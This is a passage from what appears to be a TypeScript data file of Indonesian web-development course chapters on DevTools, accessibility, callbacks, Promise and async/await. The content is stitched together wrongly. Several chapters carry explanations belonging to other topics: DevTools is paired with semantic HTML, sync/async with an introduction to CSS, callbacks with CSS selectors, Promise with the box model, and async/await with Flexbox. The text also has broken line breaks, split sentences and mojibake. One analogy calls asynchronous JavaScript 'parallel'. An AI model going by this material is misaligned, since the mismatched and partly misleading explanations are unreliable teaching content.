    aiPrompt: "Jelaskan bedanya async dan defer pada tag script. Kapan menggunakan masing-masing?", reflection: "Inspect website populer. Lihat bagaimana mereka load CSS dan JS."

  },

  {

    id: "2.5", moduleId: 2, chapterNum: "2.5", title: "DevTools: Alat Detektif Browser", subtitle: "Menggunakan Chrome DevTools untuk debug dan analisis", level: "Pemula",

    objectives: ["Bisa menggunakan Chrome DevTools untuk debugging", "Mengerti tab Elements, Console, Network, dan Performance"],

    analogy: { diagram: "DevTools = Alat Dokter untuk Website:\n\nElements = Stetoskop (Lihat struktur)\nConsole = Termometer (Cek kondisi)\nNetwork = EKG (Lihat aliran data)\nSources = Rontgen (Lihat ke dalam)\nPerformance = Tes Darah (Analisis)\nApplication = Riwayat Medis (Storage)", caption: "DevTools seperti alat medis — masing-masing punya fungsi spesifik" },

    explanation: "Di awal-awal web, hampir semua orang menggunakan tag `<div>` untuk segala sesuatu. Butuh header? `<div class=\\\"header\\\">`. Butuh navigasi?\n\n`<div class=\\\"nav\\\">`. Butuh footer? `<div class=\\\"footer\\\">`. Ini berfungsi — browser tetap menampilkannya dengan benar asalkan CSS-nya benar.\n\nTapi ada masalah besar: komputer tidak mengerti makna di balik `<div>`. Browser, search engine, dan screen reader (alat bantu tunanetra) semuanya melihat sekumpulan `<div>` yang tidak punya makna. Mereka tidak tahu mana bagian penting, mana navigasi, mana konten utama.\\n\\nHTML5 memperkenalkan **tag semantic** — tag yang namanya sudah menjelaskan maknanya. Ini seperti memberi label pada setiap ruangan di rumah.\n\nBukan cuma \\\"ruangan A, B, C\\\" tapi \\\"ruang tamu, dapur, kamar tidur, kamar mandi.\\\" Label yang jelas memudahkan semua orang — termasuk Google dan screen reader — untuk memahami struktur website-mu.\\n\\n**Tag Semantic Utama:**\\n\\n**`<header>` — Bagian Atas**\\nDigunakan untuk bagian pengenal halaman — biasanya berisi logo, judul situs, dan navigasi utama. Bisa juga digunakan di dalam `<article>` untuk header artikel (judul + tanggal + penulis).\\n\\n**`<nav>` — Navigasi**\\nDigunakan KHUSUS untuk blok link navigasi utama — menu utama, breadcrumb, pagination. Bukan untuk semua kumpulan link (seperti link di footer atau daftar link di artikel).\\n\\n**`<main>` — Konten Utama**\\nHanya boleh ada SATU `<main>` per halaman. Berisi konten utama yang unik untuk halaman tersebut.\n\nKonten yang berulang di setiap halaman (seperti header dan footer) tidak masuk `<main>`.\\n\\n**`<article>` — Konten Independen**\\nBerisi konten yang bisa berdiri sendiri — posting blog, berita, komentar, kartu produk.\n\nArtinya: kalau konten itu diambil dan dipublikasikan sendiri, masih masuk akal.\\n\\n**`<section>` — Bagian Tematik**\\nMengelompokkan konten yang memiliki tema sama.\n\nBiasanya diawali dengan heading.\n\nContoh: bagian \\\"Testimoni\\\" di landing page, atau bagian \\\"Fitur Utama\\\".\\n\\n**`<aside>` — Konten Samping**\\nBerisi konten yang terkait tapi terpisah dari konten utama — sidebar, widget, iklan,\n\nCatatan kaki.\\n\\n**`<footer>` — Bagian Bawah**\\nBerisi informasi penutup — copyright, link ke kebijakan privasi, kontak, social media links.\\n\\n**`<figure>` dan `<figcaption>` — Gambar dengan Keterangan**\\nMengelompokkan gambar/diagram dengan keterangannya.\n\nBerguna untuk ilustrasi, diagram, foto berita.\\n\\n**`<time>` — Waktu dan Tanggal**\\nMenandai waktu/tanggal dengan attribute `datetime` untuk format mesin-readable.\\n\\n**Manfaat Semantic HTML:**\\n1. **SEO**: Google lebih mudah memahami struktur kontenmu — mana judul, mana penting, mana navigasi. Ini bisa meningkatkan ranking pencarian!\\n2. **Aksesibilitas**: Screen reader bisa memberi navigasi yang lebih baik bagi tunanetra — \\\"Lompat ke konten utama,\\\" \\\"Navigasi,\\\" dll.\\n3.\n\n**Maintainability**: Kode lebih mudah dibaca dan dipelihara oleh developer lain (atau dirimu sendiri 6 bulan lagi).\\n4.\n\n**Browser Features**: Beberapa browser punya fitur khusus untuk elemen semantic,\n\nReader mode yang bekerja lebih baik.\\n\\n**Dasar SEO On-Page:**\\nSEO (Search Engine Optimization) adalah praktik mengoptimalkan halaman agar muncul di hasil pencarian Google.\n\nBeberapa praktik HTML:\\n- Gunakan SATU `<h1>` per halaman yang deskriptif\\n- Gunakan hierarki heading yang benar (`h1` → `h2` → `h3`, jangan skip)\\n- Isi `<meta name=\\\"description\\\">` dengan deskripsi menarik (muncul di Google search)\\n- Gunakan attribute `alt` di SEMUA gambar\\n- Pastikan URL semantic (`/tentang` lebih baik dari `/page?id=123`)\\n- Gunakan tag semantic,\n\nBukan cuma `<div>`\\n\\nSemantic HTML bukan cuma \\\"tren\\\" atau \\\"best practice yang boleh diabaikan\\\" — ini adalah standar modern yang membuat web lebih baik untuk semua orang.",

    codeExample: { language: "javascript", code: "// CONSOLE METHODS\nconst data = [\n  { nama: 'Budi', umur: 25, kota: 'Jakarta' },\n  { nama: 'Ani', umur: 23, kota: 'Bandung' }\n];\n\nconsole.table(data);\n\nconsole.group('Proses Login');\nconsole.log('Validasi input...');\nconsole.log('Kirim ke server...');\nconsole.groupEnd();\n\nconsole.time('Loop');\nfor (let i = 0; i < 1000000; i++) {}\nconsole.timeEnd('Loop');\n\nconsole.warn('Peringatan!');\nconsole.error('Error!');" },

    explainAlong: "Baris 7: console.table untuk data tabel. Baris 10-13: console.group. Baris 16-18: console.time untuk performance. Baris 21-22: warn dan error.",

    aiPrompt: "Jelaskan cara menggunakan debugger di Chrome DevTools Sources tab.", reflection: "Buka halaman manapun → DevTools → Network → refresh. Berapa banyak request? Berapa total ukuran data?"

  },



  {

    id: "2.6",

    moduleId: 2,

    chapterNum: "2.6",

    title: "Aksesibilitas Web untuk Semua Orang",

    subtitle: "Prinsip WCAG, ARIA, dan membuat web yang inklusif",

    level: "Pemula",

    objectives: [

      "Memahami pentingnya aksesibilitas web",

      "Bisa menerapkan praktik aksesibilitas dasar",

      "Mengenal ARIA dan kapan menggunakannya",

    ],

    analogy: {

      diagram: "Aksesibilitas = Fasilitas Umum:\\n\\nRambar Jalan  = alt text untuk gambar\\nBraille      = semantic HTML + screen reader\\nLift         = keyboard navigation\\nPapan Besar  = warna kontras tinggi + font besar",

      caption: "Web yang aksesibel bisa diakses semua orang, termasuk penyandang disabilitas",

    },

    explanation: "Pernahkah kamu memperhatikan fasilitas di dunia nyata yang dirancang untuk penyandang disabilitas? Rambu-rambu lalu lintas dengan suara untuk tunanetra, rambatan (ramp) di trotoar untuk kursi roda, lift dengan tombol braille, pintu otomatis yang bisa dibuka tanpa menggunakan tangan. Fasilitas ini tidak hanya membantu penyandang disabilitas — orang tua dengan kereta bayi, orang yang membawa barang berat, atau seseorang dengan kaki cedera juga terbantu. Ini adalah prinsip **universal design**: desain yang baik membantu semua orang.\\n\\nDi dunia web, prinsip yang sama berlaku.\n\n**Aksesibilitas web (a11y)** berarti memastikan website bisa diakses dan digunakan oleh semua orang, termasuk penyandang disabilitas. Menurut WHO, ada 1 miliar orang di dunia yang memiliki disabilitas — itu 15% populasi dunia! Dan banyak dari mereka menggunakan internet setiap hari.\\n\\n**Macam-macam Disabilitas yang Perlu Diperhatikan:**\\n\\n**Tunanetra (Visual Impairment)** — Mereka menggunakan **screen reader**, software yang membaca konten halaman dengan suara. Screen reader mengandalkan tag HTML semantic untuk memahami struktur — itulah kenapa `<h1>`, `<nav>`, `<main>`, `<article>`, dan `alt` text sangat penting.\n\nTanpa tag semantic, screen reader hanya bisa membaca teks tanpa konteks — seperti mendengar buku tanpa tahu mana judul,\n\nMana paragraf, mana navigasi.\\n\\n**Tunarungu (Hearing Impairment)** — Mereka tidak bisa mendengar audio atau video.\n\nSolusinya: sediakan **subtitle/caption** untuk video, **transkrip** untuk podcast,\n\nDan jangan mengandalkan suara sebagai satu-satunya cara menyampaikan informasi.\\n\\n**Motor Impairment** — Mereka mungkin tidak bisa menggunakan mouse dengan presisi, atau sama sekali.\n\nMereka mengandalkan **keyboard navigation** — berpindah antar elemen menggunakan tombol Tab, Enter, dan panah.\n\nSemua elemen interaktif di website-mu harus bisa diakses dengan keyboard.\\n\\n**Kognitif** — Mereka mungkin kesulitan memproses informasi kompleks.\n\nSolusinya: gunakan bahasa yang jelas dan sederhana, konsisten dalam navigasi, berikan instruksi yang jelas, dan hindari distraksi yang berlebihan.\\n\\n**Praktik Aksesibilitas yang Harus Diterapkan:**\\n\\n1. **Selalu isi `alt` text pada gambar** — Teks alternatif yang mendeskripsikan gambar. Kalau gambar bersifat dekoratif, gunakan `alt=\\\"\\\"`.\\n2. **Gunakan tag semantic dengan benar** — `<h1>` untuk judul utama, `<nav>` untuk navigasi, `<main>` untuk konten utama, `<button>` untuk tombol (bukan `<div onClick>`!).\\n3.\n\n**Pastikan semua elemen interaktif bisa diakses keyboard** — Coba navigasikan website-mu hanya dengan tombol Tab. Apakah semua link, tombol, dan form bisa difokus?\\n4. **Gunakan warna dengan kontras yang cukup** — Teks harus mudah dibaca di latar belakangnya. Gunakan tool seperti WebAIM Contrast Checker untuk memeriksa.\\n5.\n\n**Jangan mengandalkan warna sebagai satu-satunya cara menyampaikan informasi** — Tambahkan ikon atau teks.\n\nContoh: error form jangan cuma border merah, tambahkan juga pesan error.\\n6.\n\n**Gunakan font yang mudah dibaca** — Ukuran minimal 16px untuk body text, line-height yang cukup (1.5x),\n\nHindari font yang terlalu dekoratif.\\n\\n**ARIA (Accessible Rich Internet Applications):**\\nARIA adalah set atribut HTML tambahan yang memberikan informasi aksesibilitas lebih detail ke screen reader.\n\nARIA digunakan ketika HTML semantic tidak cukup — terutama untuk aplikasi web interaktif kompleks.\\n- `role`: Menentukan peran elemen (contoh: `role=\\\"navigation\\\"`, `role=\\\"alert\\\"`)\\n- `aria-label`: Memberi label untuk elemen (contoh: tombol hamburger menu: `aria-label=\\\"Menu navigasi\\\"`)\\n- `aria-expanded`: Menandakan apakah elemen terbuka atau tertutup (untuk dropdown, accordion)\\n- `aria-live`: Memberitahu screen reader bahwa konten akan berubah dinamis (untuk notifikasi,\n\nHasil pencarian)\\n\\n**Tapi ingat: ARIA adalah pelengkap, bukan pengganti HTML semantic.** Gunakan tag HTML yang benar terlebih dahulu, baru tambahkan ARIA jika diperlukan.\\n\\n**Kenapa aksesibilitas penting?** Selain alasan moral dan inklusi, aksesibilitas juga berdampak positif pada SEO, usability, dan bahkan legal compliance (banyak negara mewajibkan website pemerintah dan layanan publik untuk aksesibel).\n\nWebsite yang aksesibel adalah website yang berkualitas.",

    codeExample: {

      language: "html",

      code: "<!-- Aksesibilitas: Contoh Baik vs Buruk -->\n\n<!-- ❌ BURUK: Tombol div tanpa aksesibilitas -->\n<div onclick=\"bukaMenu()\" class=\"tombol-menu\">☰</div>\n\n<!-- ✅ BAIK: Tombol asli dengan ARIA -->\n<button onclick=\"bukaMenu()\" \n        aria-label=\"Buka menu navigasi\"\n        aria-expanded=\"false\"\n        id=\"tombol-menu\">\n  ☰\n</button>\n<nav id=\"menu\" aria-labelledby=\"tombol-menu\" hidden>\n  <ul>\n    <li><a href=\"/\">Beranda</a></li>\n    <li><a href=\"/modul\">Modul</a></li>\n  </ul>\n</nav>\n\n<!-- ❌ BURUK: Gambar tanpa alt -->\n<img src=\"grafik.jpg\">\n\n<!-- ✅ BAIK: Gambar dengan alt deskriptif -->\n<img src=\"grafik.jpg\" \n     alt=\"Grafik peningkatan traffic website 50% dari Januari ke Juni 2026\">\n\n<!-- ❌ BURUK: Form tanpa label -->\n<input type=\"text\" placeholder=\"Nama\">\n\n<!-- ✅ BAIK: Form dengan label terhubung -->\n<label for=\"nama-lengkap\">Nama Lengkap *</label>\n<input type=\"text\" id=\"nama-lengkap\" name=\"nama\" required>\n\n<!-- Skip Link untuk Keyboard Navigation -->\n<a href=\"#konten-utama\" class=\"skip-link\">\n  Lompat ke konten utama\n</a>\n<main id=\"konten-utama\">\n  <h1>Judul Halaman</h1>\n</main>",

    },

    explainAlong: "Baris 4-8: Tombol semantik dengan aria-label dan aria-expanded. Baris 13-15: Gambar dengan alt deskriptif. Baris 18-20: Label terhubung dengan input via for+id. Baris 23-27: Skip link untuk navigasi keyboard.",

    aiPrompt: "Jelaskan perbedaan antara tag <button> dan <div> yang di-styling seperti tombol dari sudut pandang aksesibilitas. Kenapa <button> lebih baik?",

    reflection: "Coba navigasikan website favoritmu hanya dengan tombol Tab (tanpa mouse!). Berapa banyak elemen yang tidak bisa diakses? Apakah ada skip link?",

  }

];



// ============================================================

// MODUL 3: Logika Asinkron & Event (6 chapters)

// ============================================================

const modul3: Chapter[] = [

  {

    id: "3.1", moduleId: 3, chapterNum: "3.1", title: "Sinkron vs Asinkron: Antrian di Bank", subtitle: "Perbedaan eksekusi kode sinkron dan asinkron", level: "Pemula-Menengah",

    objectives: ["Memahami perbedaan eksekusi sinkron dan asinkron", "Mengerti kenapa JavaScript butuh asinkron"],

    analogy: { diagram: "Sinkron = 1 Loket:\n[A]→[B]→[C]→[D] (Nunggu bergiliran)\n\nAsinkron = Banyak Loket:\n[Loket1] [Loket2] [Loket3]\n   ↑        ↑        ↑\n   A        B        C\n(Parallel!)", caption: "Sinkron = satu per satu, Asinkron = banyak task berjalan paralel" },

    explanation: "Kalau HTML adalah kerangka rumah — fondasi, dinding, dan struktur — maka **CSS (Cascading Style Sheets)** adalah dekorasi interior: cat dinding,\n\nWarna pintu, jenis lampu, furniture, hiasan, dan tata letak ruangan.\n\nTanpa CSS, setiap halaman web akan terlihat sama: teks hitam di latar belakang putih, tanpa warna,\n\nTanpa layout yang menarik, tanpa animasi — seperti rumah yang belum dihuni dan didekorasi.\n\nBisa dipakai?\n\nBisa.\n\nTapi nyaman dan indah? Jauh dari itu.\\n\\n**Apa itu CSS?** CSS adalah bahasa stylesheet yang mengontrol tampilan dan layout elemen HTML. CSS menjawab pertanyaan-pertanyaan seperti: Berapa ukuran font heading ini? Warna latar belakang halaman apa?\n\nSeberapa lebar sidebar? Gambar ini di sebelah kiri atau kanan? Tombol ini berwarna apa saat di-hover? Semua itu adalah tugas CSS.\n\nDengan CSS, kamu bisa mengubah website yang polos menjadi halaman yang indah, profesional,\n\nDan memukau.\\n\\n**Sejarah Singkat CSS:** CSS pertama kali diusulkan oleh HÃ¥kon Wium Lie pada tahun 1994 di CERN — tempat yang sama HTML diciptakan!\n\nSebelum CSS, styling ditaruh langsung di HTML (attribute seperti `<font color=\\\"red\\\">`) yang membuat kode berantakan dan sulit dipelihara.\n\nCSS memisahkan konten (HTML) dari presentasi (CSS) — prinsip yang sangat penting dalam software engineering.\n\nVersi terbaru adalah CSS3 yang membawa fitur seperti flexbox, grid, animasi, gradient, shadow, dan responsive design.\\n\\n**Tiga Cara Menyambungkan CSS ke HTML:**\\n\\n**1.\n\nInline CSS** — Style langsung di tag HTML menggunakan attribute `style`.\\nContoh: `<p style=\\\"color: red; font-size: 16px;\\\">`\\nKeuntungan: cepat untuk testing. Kekurangan: tidak reusable, sulit dipelihara, campur aduk konten dan style. Hindari untuk production!\\n\\n**2. Internal CSS** — Style ditulis di dalam tag `<style>` di head dokumen.\\nCocok untuk halaman tunggal atau prototype.\n\nTapi kalau punya banyak halaman, style harus di-copy ke setiap halaman — tidak efisien!\\n\\n**3.\n\nExternal CSS (REKOMENDASI)** — Style ditulis di file terpisah (`.css`) dan disambungkan dengan `<link>`.\\nKeuntungan: satu file CSS bisa dipakai oleh banyak halaman HTML,\n\nBrowser cache file CSS sehingga loading halaman berikutnya lebih cepat, dan pemisahan concerns yang bersih antara konten dan style.\n\nIni adalah cara yang digunakan 99% website profesional.\\n\\n**Sintaks CSS:**\\nCSS terdiri dari aturan-aturan (rules).\n\nSetiap aturan punya dua bagian:\\n```\\nselector {\\n  property: value;\\n}\\n```\\n- **Selector**: Menentukan ELEMEN HTML mana yang akan di-styling.\n\nContoh: `h1`, `.class`, `#id`\\n- **Property**: Aspek apa yang ingin diubah.\n\nContoh: `color`, `font-size`, `background`\\n- **Value**: Nilai baru untuk property tersebut.\n\nContoh: `red`, `16px`, `#ffffff`\\n\\nContoh lengkap:\\n```css\\nh1 {\\n  color: navy;\\n  font-size: 32px;\\n  text-align: center;\\n}\\n```\\n\\nArtinya: \\\"Semua elemen h1, ubah warna teksnya menjadi navy, ukuran font 32 piksel, dan rata tengah.\\\"\\n\\n**Cascading** dalam CSS artinya style bisa \\\"menurun\\\" dan \\\"ditumpuk.\\\" Beberapa aturan bisa berlaku untuk elemen yang sama,\n\nDan CSS punya mekanisme untuk menentukan aturan mana yang \\\"menang\\\" — ini disebut **specificity** dan akan kita pelajari di chapter selanjutnya.\\n\\n**Kenapa memisahkan CSS dari HTML penting?** Karena ini adalah prinsip **separation of concerns** — setiap teknologi punya tugasnya sendiri: HTML untuk struktur dan makna, CSS untuk tampilan, JavaScript untuk perilaku.\n\nPemisahan ini membuat kode lebih mudah dipelihara, lebih mudah dikerjakan tim (satu orang kerja HTML, satu orang kerja CSS),\n\nDan lebih fleksibel (bisa mengganti tema tanpa mengubah HTML).\\n\\nJadi, HTML adalah TULANG, CSS adalah KULIT dan PAKEAIAN, dan JavaScript adalah OTOT yang membuatnya bergerak.\n\nKetiganya bekerja sama untuk menciptakan pengalaman web yang lengkap.",

    codeExample: { language: "javascript", code: "// SINKRON: Berurutan, blocking\nconsole.log('1. Mulai');\nconsole.log('2. Proses...');\nfor (let i = 0; i < 1000000000; i++) {} // Lambat!\nconsole.log('3. Selesai');\n\n// ASINKRON: Tidak blocking\nconsole.log('1. Mulai');\nsetTimeout(() => {\n  console.log('3. Ini jalan nanti');\n}, 2000);\nconsole.log('2. Langsung lanjut!');\n\n// ASINKRON: Fetch API\nconsole.log('1. Request data...');\nfetch('https://api.example.com/data')\n  .then(res => res.json())\n  .then(data => console.log('3. Data:', data));\nconsole.log('2. Lanjut tanpa nunggu!');" },

    explainAlong: "Baris 1-4: Sinkron — for loop blocking. Baris 7-11: setTimeout asinkron. Baris 14-17: Fetch API asinkron.",

    aiPrompt: "Jelaskan kenapa JavaScript disebut 'single-threaded' tapi bisa menjalankan kode asinkron. Apa itu event loop?", reflection: "Coba tulis kode fetch(). Gunakan console.log() sebelum dan sesudah. Apa urutan outputnya?"

  },

  {

    id: "3.2", moduleId: 3, chapterNum: "3.2", title: "Callback: Fungsi dalam Fungsi", subtitle: "Konsep callback dan callback hell", level: "Pemula-Menengah",

    objectives: ["Memahami konsep callback function", "Mengerti masalah callback hell dan solusinya"],

    analogy: { diagram: "Callback = Surat Pengingat:\n\nKamu: 'Mas, kalau nasi gorengnya jadi, antar ke meja 5 ya.'\nPelayan: 'Oke, saya ingat.'\n\n(Nasi goreng jadi)\nPelayan: 'Ini untuk meja 5!' (callback dipanggil)", caption: "Callback = 'panggil saya kalau sudah selesai'" },

    explanation: "Bayangkan kamu berada di tengah keramaian konser musik. Ada ribuan orang, dan kamu ingin memberikan sesuatu ke orang-orang tertentu. Kalau kamu teriak \\\"Halo semua!\\\", semua orang akan menoleh — itu adalah selektor universal. Tapi kalau kamu bilang \\\"Kaos merah maju!\\\", cuma yang pakai kaos merah yang maju — itu adalah selektor class.\n\nKalau kamu sebut nama \\\"Budi!\\\", hanya Budi yang merespons — itu adalah selektor ID. CSS bekerja dengan cara yang sama: selektor menentukan elemen mana yang akan menerima styling.\\n\\n**Selektor Dasar:**\\n\\n**1. Selektor Elemen (Type Selector)** — Memilih semua elemen dengan tag tertentu.\\n`h1 { color: blue; }` → Semua h1 jadi biru.\\n`p { font-size: 14px; }` → Semua paragraf jadi 14px.\\nPaling umum digunakan untuk styling global dan reset dasar.\\n\\n**2. Selektor Class (`.`)** — Memilih elemen dengan class tertentu.\n\nSatu elemen bisa punya banyak class, dan banyak elemen bisa punya class yang sama. Inilah yang membuat class sangat fleksibel dan menjadi selektor yang paling sering digunakan.\\n`.btn { padding: 10px; }` → Semua elemen dengan class=\\\"btn\\\"\\n`.btn.primary { background: blue; }` → Elemen dengan class=\\\"btn primary\\\" (dua class sekaligus!)\\n\\n**3. Selektor ID (`#`)** — Memilih elemen dengan ID tertentu. ID harus UNIK di satu halaman — tidak boleh ada dua elemen dengan ID sama.\n\nKarena unik, ID punya specificity tertinggi di antara selektor dasar.\\n`#header { height: 80px; }` → Elemen dengan id=\\\"header\\\"\\n\\n**4.\n\nSelektor Descendant (Spasi)** — Memilih elemen yang berada di dalam elemen lain,\n\nTidak peduli seberapa dalam.\\n`nav a { color: red; }` → Semua `<a>` yang ada di dalam `<nav>`\\n`.card p { font-size: 12px; }` → Semua `<p>` di dalam elemen dengan class=\\\"card\\\"\\n\\n**5.\n\nSelektor Child Direct (`>`)** — Memilih elemen yang LANGSUNG menjadi anak (bukan cucu atau lebih dalam).\\n`ul > li { list-style: square; }` → Hanya `<li>` yang langsung di dalam `<ul>`\\n\\n**6.\n\nSelektor Adjacent Sibling (`+`)** — Memilih elemen yang bersebelahan langsung setelah elemen tertentu.\\n`h2 + p { margin-top: 0; }` → Paragraf yang langsung setelah h2\\n\\n**Pseudo-class: Selektor Keadaan**\\nPseudo-class memilih elemen berdasarkan keadaan (state) tertentu:\\n- `:hover` — Saat mouse berada di atas elemen\\n- `:focus` — Saat elemen sedang difokus (klik atau tab)\\n- `:active` — Saat elemen sedang di-klik (ditahan)\\n- `:first-child` — Elemen pertama di antara saudaranya\\n- `:last-child` — Elemen terakhir\\n- `:nth-child(n)` — Elemen ke-n\\n- `:not(selector)` — Elemen yang TIDAK cocok dengan selektor\\n\\n**Pseudo-element: Bagian Elemen**\\nPseudo-element men-target bagian spesifik dari elemen:\\n- `::before` — Menambahkan konten sebelum elemen\\n- `::after` — Menambahkan konten setelah elemen\\n- `::first-line` — Baris pertama teks\\n- `::first-letter` — Huruf pertama teks\\n\\n**Specificity: Siapa yang Menang?**\\nKetika dua aturan CSS bertabrakan, specificity menentukan mana yang menang:\\n1.\n\nInline style (1000 poin) — paling kuat\\n2. ID selector (100 poin) — `#header`\\n3. Class/pseudo-class/attribute (10 poin) — `.btn`, `:hover`, `[type=\\\"text\\\"]`\\n4. Elemen/pseudo-element (1 poin) — `div`, `::before`\\n\\nSpecificity dihitung dengan sistem ini.\n\nContoh: `#nav .menu a` = 100 + 10 + 1 = 111 poin.\\n\\n**Aturan Cascade** — Kalau specificity sama,\n\nAturan yang ditulis TERAKHIR yang menang.\\n**Aturan `!important`** — Menimpa semua specificity.\n\nGunakan dengan sangat hemat!",

    codeExample: { language: "javascript", code: "// CALLBACK HELL\ngetUser(1, (user) => {\n  getOrders(user.id, (orders) => {\n    getProducts(orders[0].id, (products) => {\n      getReviews(products[0].id, (reviews) => {\n        console.log(reviews); // Menjorok terus...\n      });\n    });\n  });\n});\n\n// SOLUSI: REFACTOR KE FUNGSI TERPISAH\nfunction handleUser(user) {\n  getOrders(user.id, handleOrders, handleError);\n}\nfunction handleOrders(orders) {\n  getProducts(orders[0].id, handleProducts, handleError);\n}\nfunction handleProducts(products) {\n  getReviews(products[0].id, handleReviews, handleError);\n}\nfunction handleReviews(reviews) {\n  console.log(reviews);\n}\nfunction handleError(err) {\n  console.error(err);\n}\n\ngetUser(1, handleUser, handleError); // Lebih rapi!" },

    explainAlong: "Baris 1-9: Callback hell — nested callback. Baris 12-27: Solusi — pisahkan menjadi fungsi named.",

    aiPrompt: "Jelaskan kenapa callback hell disebut 'pyramid of doom'. Apa kelemahannya?", reflection: "Cari kode callback bersarang di proyekmu. Berapa level nesting terdalam? Coba refactor."

  },

  {

    id: "3.3", moduleId: 3, chapterNum: "3.3", title: "Promise: Janji di JavaScript", subtitle: "Menggunakan Promise untuk menangani operasi asinkron", level: "Pemula-Menengah",

    objectives: ["Memahami konsep Promise dan state-nya", "Bisa membuat dan menggunakan Promise"],

    analogy: { diagram: "Promise = Resi Pesanan Online:\n\n[Pending] → 'Pesanan diproses'\n   ↓\n[Fulfilled] → 'Pesanan berhasil!' ✅\n   ↓\n[Rejected] → 'Pesanan gagal!' ❌", caption: "Promise seperti resi pesanan — punya 3 status" },

    explanation: "Di CSS, **setiap elemen HTML dianggap sebagai sebuah kotak.** Ini adalah konsep paling fundamental dalam layout web — disebut **CSS Box Model.** Memahami box model adalah kunci untuk bisa mengatur tata letak halaman dengan presisi.\n\nTanpa pemahaman box model, kamu akan frustrasi karena elemen tidak pernah berada di posisi yang kamu harapkan, ukurannya tidak sesuai,\n\nDan spacing terlihat aneh.\\n\\n**Bayangkan kamu mengirimkan hadiah lewat kurir.** Hadiah itu ada di dalam kardus.\n\nMari kita analogikan setiap bagian box model dengan komponen pengiriman:\\n\\n**Content = Barang Hadiah Itu Sendiri**\\nContent adalah area di dalam elemen tempat konten sebenarnya berada — teks, gambar, video, atau elemen anak.\n\nUkuran content ditentukan oleh `width` dan `height`.\n\nSecara default, kalau kamu set `width: 300px`,\n\nItu berarti content area-nya 300px lebarnya.\\n\\n**Padding = Bubble Wrap / Kertas Pelindung**\\nPadding adalah ruang kosong DI DALAM elemen, antara content dan border.\n\nPadding memberi \\\"napas\\\" pada konten — jarak antara teks dan garis tepi elemen.\n\nPadding selalu berwarna sama dengan background elemen (karena dia di dalam elemen).\n\nSemakin besar padding, semakin \\\"gemuk\\\" elemen terlihat.\n\nPadding bisa diatur per sisi: `padding-top`, `padding-right`, `padding-bottom`, `padding-left`, atau shorthand `padding: 10px 20px 15px 25px` (atas,\n\nKanan, bawah, kiri).\\n\\n**Border = Kardus Pengiriman**\\nBorder adalah garis tepi yang mengelilingi padding dan content.\n\nBorder punya tiga properti:\\n- `border-width`: Tebal garis (px, em)\\n- `border-style`: Jenis garis (solid, dashed, dotted,\n\nDouble)\\n- `border-color`: Warna garis\\nShorthand: `border: 2px solid black;`\\n\\n**Margin = Jarak Antar Kardus**\\nMargin adalah ruang kosong DI LUAR elemen, di luar border.\n\nMargin memisahkan elemen dari elemen lain di sekitarnya.\n\nMargin tidak berwarna — dia transparan dan menunjukkan background elemen induk atau halaman.\n\nMargin bisa diatur per sisi seperti padding, dan juga punya shorthand.\\n\\n**Box-sizing: Content-box vs Border-box**\\nIni adalah konsep yang sering membingungkan pemula. Secara default, browser menggunakan `box-sizing: content-box`, yang berarti `width` dan `height` yang kamu tentukan HANYA berlaku untuk content area. Jadi kalau kamu tulis:\\n```css\\n.box {\\n  width: 300px;\\n  padding: 20px;\\n  border: 5px solid black;\\n}\\n```\\nLebar TOTAL elemen = 300 + 20 + 20 + 5 + 5 = **350px!** Bukan 300px!\\n\\nIni membuat perhitungan layout sangat rumit. Solusinya: gunakan `box-sizing: border-box`.\n\nDengan border-box, `width` dan `height` yang kamu tentukan sudah INCLUDES padding dan border.\n\nJadi lebar TOTAL tetap 300px — lebih intuitif!\\n\\n**Best Practice:** Selalu set `box-sizing: border-box` di semua elemen:\\n```css\\n*, *::before,\n\n*::after {\\n  box-sizing: border-box;\\n}\\n```\\n\\n**Margin Collapse** — Fenomena unik di CSS di mana margin vertikal antara dua elemen yang bersebelahan akan \\\"bertabrakan\\\" dan yang lebih besar yang menang.\n\nContoh: elemen A punya margin-bottom 30px, elemen B punya margin-top 20px.\n\nJarak antara mereka bukan 50px, tapi **30px** (yang lebih besar).\\n\\n**Kenapa box model penting?** Karena 90% layout web adalah tentang mengatur kotak-kotak ini.\n\nFlexbox, Grid, Float — semuanya pada dasarnya adalah cara mengatur box model. Memahami box model dengan baik akan menghemat berjam-jam frustrasi debugging layout.",

    codeExample: { language: "javascript", code: "// MEMBUAT PROMISE\nconst pesanMakanan = (menu) => {\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      const berhasil = Math.random() > 0.3;\n      if (berhasil) {\n        resolve(`${menu} sudah jadi!`);\n      } else {\n        reject(`Bahan ${menu} habis!`);\n      }\n    }, 2000);\n  });\n};\n\n// MENGGUNAKAN PROMISE\npesanMakanan('Nasi Goreng')\n  .then((hasil) => {\n    console.log('✅', hasil);\n    return pesanMakanan('Es Teh');\n  })\n  .then((hasil) => {\n    console.log('✅', hasil);\n  })\n  .catch((error) => {\n    console.error('❌', error);\n  })\n  .finally(() => {\n    console.log('Selesai.');\n  });" },

    explainAlong: "Baris 2-12: Buat Promise dengan resolve/reject. Baris 15-27: Chain .then(), .catch(), .finally().",

    aiPrompt: "Jelaskan bedanya Promise.resolve() dan Promise.reject(). Apa kegunaan Promise.all()?", reflection: "Ubah kode callback hell menjadi Promise. Apakah lebih mudah dibaca?"

  },

  {

    id: "3.4", moduleId: 3, chapterNum: "3.4", title: "Async/Await: Kode Asinkron yang Terlihat Sinkron", subtitle: "Syntax modern untuk menulis kode asinkron", level: "Pemula-Menengah",

    objectives: ["Memahami syntax async/await", "Bisa mengubah Promise menjadi async/await"],

    analogy: { diagram: "Callback = Surat (Lama, tunggu balasan)\nPromise = Telepon ('Nanti saya hubungi')\nAsync/Await = Video Call (Langsung real-time)", caption: "Async/await membuat kode asinkron terasa seperti kode biasa" },

    explanation: "Sebelum Flexbox ada, membuat layout di CSS sangat sulit. Developer harus menggunakan float (yang sebenarnya untuk teks mengelilingi gambar), clearfix hacks, position absolute/relative yang membingungkan, dan table layout yang tidak fleksibel. Membuat sesuatu yang sederhana seperti \\\"tiga kolom dengan tinggi sama\\\" atau \\\"tombol di tengah halaman\\\" bisa memakan waktu berjam-jam dan puluhan baris CSS.\\n\\n**Lalu Flexbox hadir di tahun 2009 dan mengubah segalanya.** Flexbox (Flexible Box Layout) adalah sistem layout satu dimensi yang membuat penyusunan elemen menjadi sangat mudah dan intuitif. Dengan Flexbox, kamu bisa membuat layout kompleks hanya dengan beberapa baris CSS.\n\nFlexbox dirancang khusus untuk layout komponen dan penyusunan item dalam satu baris atau kolom — sempurna untuk navigasi,\n\nCard layouts, form alignment, dan centering.\\n\\n**Konsep Dasar Flexbox:**\\n\\nAda dua entitas dalam Flexbox:\\n1.\n\n**Flex Container** — Elemen 